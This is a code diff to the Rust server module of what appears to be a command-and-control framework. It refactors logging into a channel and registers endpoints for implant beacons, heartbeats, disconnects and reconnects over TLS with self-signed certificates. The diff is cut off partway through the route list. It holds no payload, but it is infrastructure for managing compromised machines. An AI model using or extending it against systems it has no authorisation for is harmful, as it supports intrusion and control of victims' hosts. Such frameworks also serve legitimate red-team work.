@@ -1,6 +1,7 @@
-use actix_web::{web, App, HttpServer, HttpResponse, Responder};
+use actix_web::{web, App, HttpServer};
 use tokio::sync::Mutex;
 use std::sync::Arc;
+use tokio::sync::mpsc::Sender;
 use std::fs::File;
 use std::io::Write;
 use std::io::BufReader;
@@ -11,15 +12,9 @@ use rcgen::generate_simple_self_signed;
 
 
 use crate::core::c2::C2;
-use crate::utils::logging::Logging; 
+use crate::utils::logging::{Logging, LogEntry}; 
 use crate::server::communication::http_session;
 
-
-// GET route: health check
-async fn health_check() -> impl Responder {
-    Logging::INFO.print_message("Health check endpoint hit");
-    HttpResponse::Ok().body("C2 Server is running")
-}
 
 pub fn generate_self_signed_cert_and_key(cert_path: &str, key_path: &str) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
     let subject_alt_names = vec!["localhost".to_string()];
@@ -138,36 +133,42 @@ pub fn configure_tls(certificate: Option<String>, private_key: Option<String>, g
 /// * `Ok(())` if the server starts successfully.
 /// * `Err` if there is a server or TLS configuration error.
 pub async fn run_server(
-    addr: &str, c2: Arc<Mutex<C2>>, 
+    addr: &str, c2: Arc<Mutex<C2>>, log_tx: Sender<LogEntry>,
     tls: bool, certificate: Option<String>, 
     private_key: Option<String>, generate_certs: bool) 
     -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
     let _bind_address = "0.0.0.0:8080"; // or pull from Args if needed
 
     if tls {
-        println!("[*] Starting HTTPS server on {}", addr);
+        log_tx.send((Logging::NETWORK, format!("[*] Starting HTTPS server on {}", addr))).await.ok(); // Use `.ok()` to avoid breaking on send failure
 
-        HttpServer::new(move || {
-            App::new()
-                .app_data(web::Data::new(c2.clone()))
-                .route("/", web::get().to(health_check))
-                .route("/beacon", web::post().to(http_session::handle_beacon))
-                .route("/heartbeat", web::post().to(http_session::handle_heartbeat))
-                .route("/disconnect", web::post().to(http_session::handle_disconnect))
-                .route("/reconnect", web::post().to(http_session::handle_reconnect))
-                .default_service(web::to(http_session::handle_catch_all))
-            })
-            .bind_rustls_0_23(addr, configure_tls(certificate, private_key, generate_certs)?)?// port 8443 or 443 default
-            .workers(4)
-            .run()
-            .await?
+        HttpServer::new({
+            move || {
+                App::new()
+                    .app_data(web::Data::new(log_tx.clone()))
+                    .app_data(web::Data::new(c2.clone()))
+                    .route("/", web::get().to(http_session::health_check))
+                    .route("/beacon", web::post().to(http_session::handle_beacon))
+                    .route("/heartbeat", web::post().to(http_session::handle_heartbeat))
+                    .route("/disconnect", web::post().to(http_session::handle_disconnect))
+                    .route("/reconnect", web::post().to(http_session::handle_reconnect))
+                    .default_service(web::to(http_session::handle_catch_all))
+                }})
+                .bind_rustls_0_23(addr, configure_tls(certificate, private_key, generate_certs)?)?// port 8443 or 443 default
+                .workers(4)
+                .run()
+                .await? 
+
     } else {
-        println!("[*] Starting HTTP server on {}", addr);
+        // println!("[*] Starting HTTP server on {}", addr);
+        log_tx.send((Logging::NETWORK, format!("[*] Starting HTTP server on {}", addr))).await.ok(); // Use `.ok()` to avoid breaking on send failure
+
 
         HttpServer::new(move || {
             App::new()
+                .app_data(web::Data::new(log_tx.clone()))
                 .app_data(web::Data::new(c2.clone()))
-                .route("/", web::get().to(health_check))
+                .route("/", web::get().to(http_session::health_check))
                 .route("/beacon", web::post().to(http_session::handle_beacon))
                 .route("/heartbeat", web::post().to(http_session::handle_heartbeat))
                 .route("/disconnect", web::post().to(http_session::handle_disconnect))
